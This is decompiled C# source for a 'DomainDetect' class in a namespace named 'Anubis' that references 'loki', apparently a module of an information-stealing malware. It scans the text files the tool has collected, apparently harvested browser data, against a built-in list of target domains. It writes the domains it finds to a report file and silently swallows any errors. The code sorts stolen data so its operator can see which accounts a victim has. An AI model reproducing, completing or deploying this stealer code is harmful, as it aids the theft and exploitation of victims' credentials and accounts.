using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using loki;
using loki.Properties;

namespace Anubis
{
	// Token: 0x02000048 RID: 72
	public class DomainDetect
	{
		// Token: 0x0600021C RID: 540 RVA: 0x0000EA74 File Offset: 0x0000CC74
		public static void Start(string Browser)
		{
			try
			{
				Encoding utf = Encoding.UTF8;
				List<string> list = (from w in Resources.Domains.Split(Array.Empty<char>())
				select w.Trim() into w
				where w != ""
				select w.ToLower()).ToList<string>();
				FileInfo[] files = new DirectoryInfo(Program.dir).GetFiles("*.txt", SearchOption.AllDirectories);
				List<string> list2 = new List<string>();
				foreach (FileInfo fileInfo in files)
				{
					list2.AddRange(File.ReadAllLines(fileInfo.FullName, utf));
					Console.WriteLine(fileInfo.FullName);
				}
				HashSet<string> hashSet = new HashSet<string>();
				foreach (string text in list2)
				{
					foreach (string item in (from w in text.Split(Array.Empty<char>())
					select w.Trim() into w
					where w != ""
					select w.ToLower()).ToList<string>())
					{
						if (!hashSet.Contains(item))
						{
							hashSet.Add(item);
						}
					}
				}
				HashSet<string> hashSet2 = new HashSet<string>();
				foreach (string text2 in list)
				{
					using (HashSet<string>.Enumerator enumerator3 = hashSet.GetEnumerator())
					{
						while (enumerator3.MoveNext())
						{
							if (enumerator3.Current.Contains(text2) && !hashSet2.Contains(text2))
							{
								hashSet2.Add(text2);
							}
						}
					}
				}
				File.WriteAllLines(Browser + "\\DomainDetect.txt", hashSet2, Encoding.Default);
				string.Join(", ", hashSet2);
			}
			catch
			{
			}
		}
	}
}
